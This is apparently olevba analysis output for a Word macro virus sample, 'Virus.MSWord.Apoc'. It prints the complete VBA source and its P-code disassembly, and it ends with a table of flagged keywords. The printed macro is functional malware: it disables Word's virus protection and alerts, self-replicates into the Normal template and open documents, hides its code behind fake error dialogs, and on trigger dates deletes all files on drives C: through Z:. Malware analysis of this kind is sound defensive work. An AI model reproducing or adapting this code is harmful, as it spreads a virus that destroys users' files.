olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Apoc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Apoc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Apocalypse.bas 
in file: Virus.MSWord.Apoc - OLE stream: 'Macros/VBA/Apocalypse'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I As Integer
Sub Apocalypse()
On Error Resume Next
For k = 67 To 90
drive = Chr(k) & ":\"
With Application.FileSearch
.NewSearch: .LookIn = drive: .SearchSubFolders = (True Or False)
.FileName = "*.*": .MatchTextExactly = (True And False):
.FileType = msoFileTypeAllFiles
If .Execute > 0 Then
For I = 1 To .FoundFiles.Count: Kill .FoundFiles(I): Next I
End If
End With
Next k
MsgBox "The Apocalypse has come to You!", vbCritical + vbOKOnly, ""
End Sub
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = (True And False)
Options.VirusProtection = (True And False)
Options.SaveNormalPrompt = (True And False)
Application.DisplayAlerts = wdAlertsNone
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
ExecuteApocalypse
End Sub
Sub AutoClose()
On Error Resume Next
If InStr(1, ActiveDocument.FullName, "\", vbTextCompare) <> 0 Then ExecuteApocalypse
End Sub
Sub FileSaveAs()
On Error Resume Next
ExecuteApocalypse
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub viewvbcode()
On Error Resume Next
MsgBox "Sorry, access denied.", vbExclamation + vbOKOnly, "Unexpected error..."
ShowVisualBasicEditor = 0 'h
End Sub
Sub ToolsMacro()
MsgBox "Sorry, access denied.", vbExclamation + vbOKOnly, "Unexpected error..."
End Sub
Sub filetemplates()
MsgBox "Sorry, access denied.", vbExclamation + vbOKOnly, "Unexpected error..."
End Sub
Function CheckForApocalypse() As Byte
On Error Resume Next
CheckForApocalypse = 0
For Each Item In NormalTemplate.VBProject.VBComponents
If Item.Name = "Apocalypse" Then If Integrity(2) Then CheckForApocalypse = 1
Next
For Each Item In ActiveDocument.VBProject.VBComponents
If Item.Name = "Apocalypse" Then If Integrity(1) Then CheckForApocalypse = CheckForApocalypse + 2
Next
End Function
Sub ExecuteApocalypse()
Dim stat As Byte
On Error Resume Next
stat = CheckForApocalypse
Select Case stat
Case 1
DocInfecting
Case 2
NormInfecting
End Select
If Day(Now()) = 1 Or Day(Now()) = 13 Or Day(Now()) = 26 Or Month(Now()) = 4 Then Apocalypse
End Sub
Private Sub DocInfecting()
Dim Infect As Boolean
On Error Resume Next
For Each Item In ActiveDocument.VBProject.VBComponents
If Item.Name = "Apocalypse" Then
With ActiveDocument.VBProject.VBComponents.Item("Apocalypse")
.CodeModule.DeleteLines 1, .CodeModule.CountOfLines
.CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(1, 129)
If Left$(ActiveDocument.FullName, 1) > "B" And Not ActiveDocument.Saved Then ActiveDocument.Save
Exit Sub
End With
End If
Next
NormalTemplate.VBProject.VBComponents.Item("Apocalypse").Export Environ("windir") + "\Kill.bmp"
ActiveDocument.VBProject.VBComponents.Import Environ("windir") + "\Kill.bmp"
Kill Environ("windir") + "\Kill.bmp"
If Left$(ActiveDocument.FullName, 1) > "B" And Not ActiveDocument.Saved Then ActiveDocument.Save
End Sub
Private Sub NormInfecting()
On Error Resume Next
KillAllObjectsInNormal
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Apocalypse", wdOrganizerObjectProjectItems
SetAttr NormalTemplate.FullName, vbNormal
If NormalTemplate.Saved = False Then NormalTemplate.Save
End Sub
Private Sub KillAllObjectsInNormal()
On Error Resume Next
With NormalTemplate.VBProject.VBComponents
For I = .Count To 2 Step -1
.Item(I).CodeModule.DeleteLines 1, .Item(I).CodeModule.CountOfLines
.Remove .Item(I)
Next I
.Item(1).CodeModule.DeleteLines 1, .Item(1).CodeModule.CountOfLines
End With
End Sub
Private Function Integrity(m As Byte) As Boolean
On Error Resume Next
Dim s As String
Dim l As Variant
s = "PSOFdW...IFEENMESOOOOAISEEESOIESOEDESOMSESMESMEFOCFINFINESDOsSCDCNEIEPDOFIW..IEEENNAKIEPOKASIEPOWF..N.EE"
l = Array("19", "16", "20", "16", "21", "27", "64", "56", "31", "20", "59", "6", "8", "6", "67", "7", "14", "20", "45", "42", "43", "40", "119", "110", "6", "17", "7", "15", "20", "84", "7", "16", "20", "17", "32", "7", "16", "20", "79", "28", "7", "16", "79", "7", "19", "79", "7", "37", "20", "22", "54", "76", "4", "54", "97", "4", "12", "23", "16", "20", "25", "16", "6", "12", "6", "13", "10", "91", "7", "26", "21", "20", "54", "32", "61", "51", "108", "96", "8", "8", "6", "4", "95", "76", "36", "96", "7", "27", "20", "22", "119", "41", "56", "7", "36", "20", "42", "27", "67", "16", "6", "67", "8", "7")
Integrity = True
For I = 1 To 104
If m = 1 Then
If Mid(ActiveDocument.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1), 1, 1) <> Mid(s, I, 1) Or _
Len(ActiveDocument.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1)) <> l(I - 1) Then
Integrity = False
Exit For
End If
Else
If Mid(NormalTemplate.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1), 1, 1) <> Mid(s, I, 1) Or _
Len(NormalTemplate.VBProject.VBComponents.Item("Apocalypse").CodeModule.Lines(I, 1)) <> l(I - 1) Then
Integrity = False
Exit For
End If
End If
Next I
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Apoc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Apocalypse - 9041 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn I (As Integer)
' Line #1:
' 	FuncDefn (Sub Apocalypse())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0043 
' 	LitDI2 0x005A 
' 	For 
' Line #4:
' 	Ld k 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 ":\"
' 	Concat 
' 	St drive 
' Line #5:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #6:
' 	ArgsMemCallWith NewSearch 0x0000 
' 	BoS 0x0000 
' 	Ld drive 
' 	MemStWith LookIn 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	LitVarSpecial (False)
' 	Or 
' 	Paren 
' 	MemStWith SearchSubFolders 
' Line #7:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	LitVarSpecial (False)
' 	And 
' 	Paren 
' 	MemStWith MatchTextExactly 
' 	BoS 0x0000 
' Line #8:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #9:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	Ld I 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	EndWith 
' Line #13:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	LitStr 0x001F "The Apocalypse has come to You!"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0000 ""
' 	ArgsCall MsgBox 0x0003 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub AutoOpen())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	LitVarSpecial (True)
' 	LitVarSpecial (False)
' 	And 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #19:
' 	LitVarSpecial (True)
' 	LitVarSpecial (False)
' 	And 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (True)
' 	LitVarSpecial (False)
' 	And 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #22:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	ArgsCall ExecuteApocalypse 0x0000 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub AutoClose())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 "\"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ExecuteApocalypse 0x0000 
' 	EndIf 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	ArgsCall ExecuteApocalypse 0x0000 
' Line #34:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub viewvbcode())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	LitStr 0x0015 "Sorry, access denied."
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0013 "Unexpected error..."
' 	ArgsCall MsgBox 0x0003 
' Line #39:
' 	LitDI2 0x0000 
' 	St ShowVisualBasicEditor 
' 	QuoteRem 0x001A 0x0001 "h"
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Sub ToolsMacro())
' Line #42:
' 	LitStr 0x0015 "Sorry, access denied."
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0013 "Unexpected error..."
' 	ArgsCall MsgBox 0x0003 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub filetemplates())
' Line #45:
' 	LitStr 0x0015 "Sorry, access denied."
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0013 "Unexpected error..."
' 	ArgsCall MsgBox 0x0003 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Function CheckForApocalypse() As Byte)
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	LitDI2 0x0000 
' 	St CheckForApocalypse 
' Line #50:
' 	StartForVariable 
' 	Ld Item 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #51:
' 	Ld Item 
' 	MemLd New 
' 	LitStr 0x000A "Apocalypse"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	ArgsLd Integrity 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St CheckForApocalypse 
' 	EndIf 
' 	EndIf 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	StartForVariable 
' 	Ld Item 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #54:
' 	Ld Item 
' 	MemLd New 
' 	LitStr 0x000A "Apocalypse"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ArgsLd Integrity 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld CheckForApocalypse 
' 	LitDI2 0x0002 
' 	Add 
' 	St CheckForApocalypse 
' 	EndIf 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	EndFunc 
' Line #57:
' 	FuncDefn (Sub ExecuteApocalypse())
' Line #58:
' 	Dim 
' 	VarDefn stat (As Byte)
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	Ld CheckForApocalypse 
' 	St stat 
' Line #61:
' 	Ld stat 
' 	SelectCase 
' Line #62:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #63:
' 	ArgsCall DocInfecting 0x0000 
' Line #64:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #65:
' 	ArgsCall NormInfecting 0x0000 
' Line #66:
' 	EndSelect 
' Line #67:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	Or 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Apocalypse 0x0000 
' 	EndIf 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Sub DocInfecting())
' Line #70:
' 	Dim 
' 	VarDefn Infect (As Boolean)
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	StartForVariable 
' 	Ld Item 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #73:
' 	Ld Item 
' 	MemLd New 
' 	LitStr 0x000A "Apocalypse"
' 	Eq 
' 	IfBlock 
' Line #74:
' 	StartWithExpr 
' 	LitStr 0x000A "Apocalypse"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	With 
' Line #75:
' 	LitDI2 0x0001 
' 	MemLdWith CodeModule 
' 	MemLd CountOfLines 
' 	MemLdWith CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #76:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0081 
' 	LitStr 0x000A "Apocalypse"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #77:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0001 "B"
' 	Gt 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #78:
' 	ExitSub 
' Line #79:
' 	EndWith 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	StartForVariable 
' 	Next 
' Line #82:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0009 "\Kill.bmp"
' 	Add 
' 	LitStr 0x000A "Apocalypse"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #83:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0009 "\Kill.bmp"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #84:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0009 "\Kill.bmp"
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0001 "B"
' 	Gt 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Private Sub NormInfecting())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	ArgsCall KillAllObjectsInNormal 0x0000 
' Line #90:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x000A "Apocalypse"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #91:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #92:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Private Sub KillAllObjectsInNormal())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #97:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	MemLdWith Count 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #98:
' 	LitDI2 0x0001 
' 	Ld I 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld I 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #99:
' 	Ld I 
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemCallWith Remove 0x0001 
' Line #100:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #102:
' 	EndWith 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Private Function Integrity(m As Byte) As Boolean)
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	Dim 
' 	VarDefn s (As String)
' Line #107:
' 	Dim 
' 	VarDefn l (As Variant)
' Line #108:
' 	LitStr 0x0068 "PSOFdW...IFEENMESOOOOAISEEESOIESOEDESOMSESMESMEFOCFINFINESDOsSCDCNEIEPDOFIW..IEEENNAKIEPOKASIEPOWF..N.EE"
' 	St s 
' Line #109:
' 	LitStr 0x0002 "19"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0002 "21"
' 	LitStr 0x0002 "27"
' 	LitStr 0x0002 "64"
' 	LitStr 0x0002 "56"
' 	LitStr 0x0002 "31"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "59"
' 	LitStr 0x0001 "6"
' 	LitStr 0x0001 "8"
' 	LitStr 0x0001 "6"
' 	LitStr 0x0002 "67"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "14"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "45"
' 	LitStr 0x0002 "42"
' 	LitStr 0x0002 "43"
' 	LitStr 0x0002 "40"
' 	LitStr 0x0003 "119"
' 	LitStr 0x0003 "110"
' 	LitStr 0x0001 "6"
' 	LitStr 0x0002 "17"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "15"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "84"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "17"
' 	LitStr 0x0002 "32"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "79"
' 	LitStr 0x0002 "28"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0002 "79"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "19"
' 	LitStr 0x0002 "79"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "37"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "22"
' 	LitStr 0x0002 "54"
' 	LitStr 0x0002 "76"
' 	LitStr 0x0001 "4"
' 	LitStr 0x0002 "54"
' 	LitStr 0x0002 "97"
' 	LitStr 0x0001 "4"
' 	LitStr 0x0002 "12"
' 	LitStr 0x0002 "23"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "25"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0001 "6"
' 	LitStr 0x0002 "12"
' 	LitStr 0x0001 "6"
' 	LitStr 0x0002 "13"
' 	LitStr 0x0002 "10"
' 	LitStr 0x0002 "91"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "26"
' 	LitStr 0x0002 "21"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "54"
' 	LitStr 0x0002 "32"
' 	LitStr 0x0002 "61"
' 	LitStr 0x0002 "51"
' 	LitStr 0x0003 "108"
' 	LitStr 0x0002 "96"
' 	LitStr 0x0001 "8"
' 	LitStr 0x0001 "8"
' 	LitStr 0x0001 "6"
' 	LitStr 0x0001 "4"
' 	LitStr 0x0002 "95"
' 	LitStr 0x0002 "76"
' 	LitStr 0x0002 "36"
' 	LitStr 0x0002 "96"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "27"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "22"
' 	LitStr 0x0003 "119"
' 	LitStr 0x0002 "41"
' 	LitStr 0x0002 "56"
' 	LitStr 0x0001 "7"
' 	LitStr 0x0002 "36"
' 	LitStr 0x0002 "20"
' 	LitStr 0x0002 "42"
' 	LitStr 0x0002 "27"
' 	LitStr 0x0002 "67"
' 	LitStr 0x0002 "16"
' 	LitStr 0x0001 "6"
' 	LitStr 0x0002 "67"
' 	LitStr 0x0001 "8"
' 	LitStr 0x0001 "7"
' 	ArgsArray Array 0x0068 
' 	St l 
' Line #110:
' 	LitVarSpecial (True)
' 	St Integrity 
' Line #111:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0068 
' 	For 
' Line #112:
' 	Ld m 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	LineCont 0x0004 25 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "Apocalypse"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld s 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ne 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "Apocalypse"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd l 0x0001 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #114:
' 	LitVarSpecial (False)
' 	St Integrity 
' Line #115:
' 	ExitFor 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	ElseBlock 
' Line #118:
' 	LineCont 0x0004 25 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "Apocalypse"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld s 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ne 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitStr 0x000A "Apocalypse"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd l 0x0001 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #119:
' 	LitVarSpecial (False)
' 	St Integrity 
' Line #120:
' 	ExitFor 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #124:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

